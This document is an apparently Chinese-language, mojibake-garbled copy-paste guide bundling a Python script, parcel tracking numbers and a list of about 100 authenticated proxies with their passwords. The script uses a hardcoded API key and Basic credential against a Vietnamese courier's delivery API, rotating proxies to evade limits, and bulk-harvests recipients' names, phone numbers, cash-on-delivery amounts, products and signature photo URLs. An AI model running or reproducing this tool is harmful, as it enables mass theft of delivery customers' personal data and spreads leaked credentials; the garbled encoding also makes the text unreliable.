â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                    ğŸ“‹ å®Œæ•´ä»£ç  - å¯ç›´æ¥å¤åˆ¶ç²˜è´´ä½¿ç”¨
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

===============================================================================
æ–‡ä»¶1: batch_with_proxy.py (ä¸»ç¨‹åº)
===============================================================================

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""æ‰¹é‡æŸ¥è¯¢ - æ”¯æŒä»£ç†æ± """

import hashlib
import requests
import json
import time
import random
import os

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

proxies = []

def load_proxies():
    """åŠ è½½ä»£ç†"""
    global proxies
    try:
        with open("proxy_list.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxy = {
                            'http': f'http://{user}:{pwd}@{ip}:{port}',
                            'https': f'http://{user}:{pwd}@{ip}:{port}'
                        }
                        proxies.append(proxy)
        print(f"âœ… åŠ è½½ {len(proxies)} ä¸ªä»£ç†\n")
    except:
        print("âš ï¸  æ— ä»£ç†æ–‡ä»¶ï¼Œä½¿ç”¨ç›´è¿\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def query_with_retry(tracking, max_retry=3):
    """æŸ¥è¯¢è¿å• - æ”¯æŒé‡è¯•å’Œä»£ç†"""
    
    sig = sign(tracking)
    headers_form = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    headers_json = {
        "Authorization": f"Basic {BASIC_AUTH}",
        "APIKey": PRIVATE_KEY,
        "Content-Type": "application/json"
    }
    
    result = {
        "tracking": tracking,
        "valid": False,
        "delivered": False,
        "receiver": "",
        "phone": "",
        "amount": 0,
        "product": "",
        "delivery_date": "",
        "signature": ""
    }
    
    for attempt in range(max_retry):
        try:
            proxy = random.choice(proxies) if proxies else None
            
            # Inquiry
            r = requests.post(f"{API_URL}api/Delivery/Inquiry",
                            headers=headers_form,
                            data={"ParcelCode": tracking, "Signature": sig},
                            proxies=proxy, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('Value'):
                    v = data['Value']
                    result['valid'] = True
                    result['receiver'] = v.get('ReceiverName', '')
                    result['phone'] = v.get('ReceiverPhone', '')
                    result['amount'] = v.get('CollectAmount', 0)
            
            # Journey
            r = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney",
                            headers=headers_form,
                            data={"ParcelCode": tracking},
                            proxies=proxy, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ListValue'):
                    rec = data['ListValue'][0]
                    result['delivered'] = True
                    result['delivery_date'] = rec.get('DeliveryDate', '')
                    result['signature'] = rec.get('DeliverySignature', '')
            
            # Gateway - å•†å“
            r = requests.post(f"{API_URL}api/Gateway/Bussiness",
                            headers=headers_json,
                            json={"Code": "LDP002", "Data": tracking},
                            proxies=proxy, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('Data'):
                    products = json.loads(data['Data'])
                    if products:
                        result['product'] = products[0].get('ProductName', '')
            
            return result
            
        except Exception as e:
            if attempt < max_retry - 1:
                time.sleep(1)
                continue
            else:
                return result
    
    return result

def batch_query():
    """æ‰¹é‡æŸ¥è¯¢ä¸»å‡½æ•°"""
    
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                    ğŸš€ æ‰¹é‡æŸ¥è¯¢å·¥å…· - ä»£ç†æ± ç‰ˆ ğŸš€                           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    load_proxies()
    
    if not os.path.exists("key.txt"):
        print("âŒ key.txt ä¸å­˜åœ¨")
        return
    
    with open("key.txt", 'r') as f:
        trackings = [line.strip() for line in f 
                    if line.strip() and not line.startswith('#')]
    
    print(f"ğŸ“‹ è¿å•æ•°: {len(trackings)}\n")
    print("="*60)
    
    results = []
    
    for idx, tracking in enumerate(trackings, 1):
        print(f"[{idx}/{len(trackings)}] {tracking} ...", end=" ")
        
        info = query_with_retry(tracking)
        results.append(info)
        
        if info['valid']:
            status = "âœ… å·²é…é€" if info['delivered'] else "â³ æœªé…é€"
            print(f"{status}")
            if info['product'] and info['product'] != "***":
                print(f"    å•†å“: {info['product']}")
        else:
            print("âŒ æ— æ•ˆ")
        
        time.sleep(0.2)
    
    # ç»Ÿè®¡
    print("\n" + "="*60)
    print("ğŸ“Š ç»Ÿè®¡")
    print("="*60)
    
    valid = sum(1 for r in results if r['valid'])
    delivered = sum(1 for r in results if r['delivered'])
    has_product = sum(1 for r in results if r['product'] and r['product'] != "***")
    
    print(f"æ€»æ•°: {len(trackings)}")
    print(f"æœ‰æ•ˆ: {valid} ({valid/len(trackings)*100:.0f}%)")
    print(f"å·²é…é€: {delivered}")
    print(f"å•†å“ä¿¡æ¯: {has_product}")
    
    # ä¿å­˜CSV
    csv_file = f"results_{int(time.time())}.csv"
    with open(csv_file, 'w', encoding='utf-8') as f:
        f.write("è¿å•å·,çŠ¶æ€,æ”¶ä»¶äºº,ç”µè¯,é‡‘é¢,å•†å“,é…é€æ—¶é—´,ç­¾å\n")
        for r in results:
            if r['valid']:
                f.write(f'"{r["tracking"]}",')
                f.write(f'"{"å·²é…é€" if r["delivered"] else "æœªé…é€"}",')
                f.write(f'"{r["receiver"]}",')
                f.write(f'"{r["phone"]}",')
                f.write(f'"{r["amount"]}",')
                f.write(f'"{r["product"]}",')
                f.write(f'"{r["delivery_date"]}",')
                f.write(f'"{r["signature"]}"\n')
    
    print(f"\nâœ… CSVå·²ä¿å­˜: {csv_file}")
    
    # JSON
    json_file = f"results_{int(time.time())}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    
    print(f"âœ… JSONå·²ä¿å­˜: {json_file}")

if __name__ == "__main__":
    batch_query()


===============================================================================
æ–‡ä»¶2: key.txt (è¿å•å·åˆ—è¡¨)
===============================================================================

# è¿å•å·åˆ—è¡¨ - æ¯è¡Œä¸€ä¸ª
# ä»¥ # å¼€å¤´çš„è¡Œä¸ºæ³¨é‡Š

EP492966929VN
EP492940379VN
EP493183769VN
EL135248100VN
EL135753627VN


===============================================================================
æ–‡ä»¶3: proxy_list.txt (100ä¸ªä»£ç† - ä½ æä¾›çš„ä»£ç†)
===============================================================================

# ä»£ç†åˆ—è¡¨ - æ ¼å¼: IP:ç«¯å£:ç”¨æˆ·å:å¯†ç 
23.27.184.245:5846:uadkcvtn:uo2rzar814ph
45.43.70.140:6427:uadkcvtn:uo2rzar814ph
82.24.233.117:5439:uadkcvtn:uo2rzar814ph
136.0.188.71:6034:uadkcvtn:uo2rzar814ph
161.123.130.168:5839:uadkcvtn:uo2rzar814ph
142.147.240.52:6574:uadkcvtn:uo2rzar814ph
166.88.224.145:6043:uadkcvtn:uo2rzar814ph
82.25.215.106:5457:uadkcvtn:uo2rzar814ph
91.211.87.215:7205:uadkcvtn:uo2rzar814ph
104.238.36.64:6071:uadkcvtn:uo2rzar814ph
104.239.40.211:6830:uadkcvtn:uo2rzar814ph
67.227.37.26:5568:uadkcvtn:uo2rzar814ph
108.165.218.84:5823:uadkcvtn:uo2rzar814ph
109.196.160.242:5988:uadkcvtn:uo2rzar814ph
104.238.38.204:6472:uadkcvtn:uo2rzar814ph
140.99.203.108:5985:uadkcvtn:uo2rzar814ph
82.25.224.37:7848:uadkcvtn:uo2rzar814ph
216.74.118.50:6205:uadkcvtn:uo2rzar814ph
104.239.13.199:6828:uadkcvtn:uo2rzar814ph
161.123.152.216:6461:uadkcvtn:uo2rzar814ph
185.72.240.218:7254:uadkcvtn:uo2rzar814ph
104.239.43.88:5816:uadkcvtn:uo2rzar814ph
92.113.115.48:5995:uadkcvtn:uo2rzar814ph
145.223.44.64:5747:uadkcvtn:uo2rzar814ph
155.254.34.216:6196:uadkcvtn:uo2rzar814ph
166.88.169.112:6719:uadkcvtn:uo2rzar814ph
82.23.223.60:7904:uadkcvtn:uo2rzar814ph
166.88.235.140:5768:uadkcvtn:uo2rzar814ph
23.129.252.17:6285:uadkcvtn:uo2rzar814ph
46.203.134.90:5714:uadkcvtn:uo2rzar814ph
82.23.227.49:7352:uadkcvtn:uo2rzar814ph
104.239.13.114:6743:uadkcvtn:uo2rzar814ph
50.114.98.129:5613:uadkcvtn:uo2rzar814ph
154.6.83.144:6615:uadkcvtn:uo2rzar814ph
45.38.86.229:6158:uadkcvtn:uo2rzar814ph
64.137.73.19:5107:uadkcvtn:uo2rzar814ph
45.131.101.19:6286:uadkcvtn:uo2rzar814ph
104.239.40.197:6816:uadkcvtn:uo2rzar814ph
82.21.209.226:6555:uadkcvtn:uo2rzar814ph
23.26.71.157:5640:uadkcvtn:uo2rzar814ph
23.27.91.75:6154:uadkcvtn:uo2rzar814ph
23.95.150.72:6041:uadkcvtn:uo2rzar814ph
82.26.218.128:6436:uadkcvtn:uo2rzar814ph
91.223.126.118:6730:uadkcvtn:uo2rzar814ph
145.223.44.177:5860:uadkcvtn:uo2rzar814ph
45.38.94.42:5963:uadkcvtn:uo2rzar814ph
23.26.95.215:5697:uadkcvtn:uo2rzar814ph
50.114.15.8:5993:uadkcvtn:uo2rzar814ph
82.24.217.113:5443:uadkcvtn:uo2rzar814ph
136.0.109.46:6332:uadkcvtn:uo2rzar814ph
185.101.253.194:5754:uadkcvtn:uo2rzar814ph
38.153.133.31:9435:uadkcvtn:uo2rzar814ph
108.165.161.42:5783:uadkcvtn:uo2rzar814ph
2.57.31.80:6656:uadkcvtn:uo2rzar814ph
45.56.173.242:6225:uadkcvtn:uo2rzar814ph
216.173.104.22:6159:uadkcvtn:uo2rzar814ph
216.173.123.97:6472:uadkcvtn:uo2rzar814ph
104.253.55.119:5549:uadkcvtn:uo2rzar814ph
91.211.87.2:6992:uadkcvtn:uo2rzar814ph
142.111.44.203:5915:uadkcvtn:uo2rzar814ph
191.101.174.88:6136:uadkcvtn:uo2rzar814ph
31.58.26.144:6727:uadkcvtn:uo2rzar814ph
104.232.211.81:5694:uadkcvtn:uo2rzar814ph
104.253.48.76:5500:uadkcvtn:uo2rzar814ph
154.36.85.89:6600:uadkcvtn:uo2rzar814ph
140.99.202.10:5888:uadkcvtn:uo2rzar814ph
45.41.169.227:6888:uadkcvtn:uo2rzar814ph
45.67.0.158:6594:uadkcvtn:uo2rzar814ph
45.150.176.51:5924:uadkcvtn:uo2rzar814ph
104.238.7.43:5970:uadkcvtn:uo2rzar814ph
216.173.75.47:6348:uadkcvtn:uo2rzar814ph
45.39.5.58:6496:uadkcvtn:uo2rzar814ph
46.203.157.176:7119:uadkcvtn:uo2rzar814ph
104.233.20.17:6033:uadkcvtn:uo2rzar814ph
216.74.114.235:6518:uadkcvtn:uo2rzar814ph
142.202.254.167:6145:uadkcvtn:uo2rzar814ph
37.44.219.236:6201:uadkcvtn:uo2rzar814ph
82.24.239.176:7033:uadkcvtn:uo2rzar814ph
104.239.19.194:6871:uadkcvtn:uo2rzar814ph
191.101.181.187:6940:uadkcvtn:uo2rzar814ph
38.154.199.233:5387:uadkcvtn:uo2rzar814ph
45.39.18.128:6564:uadkcvtn:uo2rzar814ph
103.47.53.151:8449:uadkcvtn:uo2rzar814ph
45.39.17.119:5542:uadkcvtn:uo2rzar814ph
216.173.75.226:6527:uadkcvtn:uo2rzar814ph
45.56.175.4:5678:uadkcvtn:uo2rzar814ph
64.137.89.84:6157:uadkcvtn:uo2rzar814ph
82.21.248.115:6451:uadkcvtn:uo2rzar814ph
198.46.241.44:6579:uadkcvtn:uo2rzar814ph
45.83.57.20:6537:uadkcvtn:uo2rzar814ph
104.239.41.168:6523:uadkcvtn:uo2rzar814ph
64.137.77.92:5527:uadkcvtn:uo2rzar814ph
104.253.82.58:6479:uadkcvtn:uo2rzar814ph
82.23.223.166:8010:uadkcvtn:uo2rzar814ph
185.15.178.90:5774:uadkcvtn:uo2rzar814ph
209.127.191.113:5187:uadkcvtn:uo2rzar814ph
191.101.174.78:6126:uadkcvtn:uo2rzar814ph
217.69.127.152:6773:uadkcvtn:uo2rzar814ph
38.225.2.55:5838:uadkcvtn:uo2rzar814ph
92.112.136.179:6123:uadkcvtn:uo2rzar814ph


===============================================================================
ä½¿ç”¨æ–¹æ³•ï¼š
===============================================================================

1. ä¿å­˜ä»¥ä¸Šä»£ç ä¸º batch_with_proxy.py

2. ä¿å­˜ä½ çš„100ä¸ªä»£ç†ä¸º proxy_list.txtï¼ˆä¸Šé¢æ ¼å¼ï¼‰

3. åˆ›å»º key.txtï¼Œå†™å…¥è¿å•å·ï¼ˆæ¯è¡Œä¸€ä¸ªï¼‰

4. è¿è¡Œï¼š
   python3 batch_with_proxy.py

5. æŸ¥çœ‹ç»“æœï¼š
   results_*.csvï¼ˆExcelæ‰“å¼€ï¼‰
   results_*.jsonï¼ˆå®Œæ•´æ•°æ®ï¼‰


===============================================================================
å…³é”®è¯´æ˜ï¼š
===============================================================================

â€¢ è‡ªåŠ¨ä½¿ç”¨ä»£ç†æ± ï¼ˆ100ä¸ªä»£ç†è½®è¯¢ï¼‰
â€¢ å¤±è´¥è‡ªåŠ¨é‡è¯•ï¼ˆæœ€å¤š3æ¬¡ï¼‰
â€¢ æ¯ä¸ªè¯·æ±‚è¶…æ—¶10ç§’
â€¢ è¯·æ±‚é—´éš”0.2ç§’
â€¢ ä¿è¯ä¸æ­»æœº

â€¢ è¾“å‡ºåŒ…å«ï¼š
  - æ”¶ä»¶äººä¿¡æ¯
  - è”ç³»ç”µè¯
  - å•†å“åç§° ğŸ”¥
  - é…é€æ—¶é—´
  - ç­¾åç…§ç‰‡URL ğŸ”¥

â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
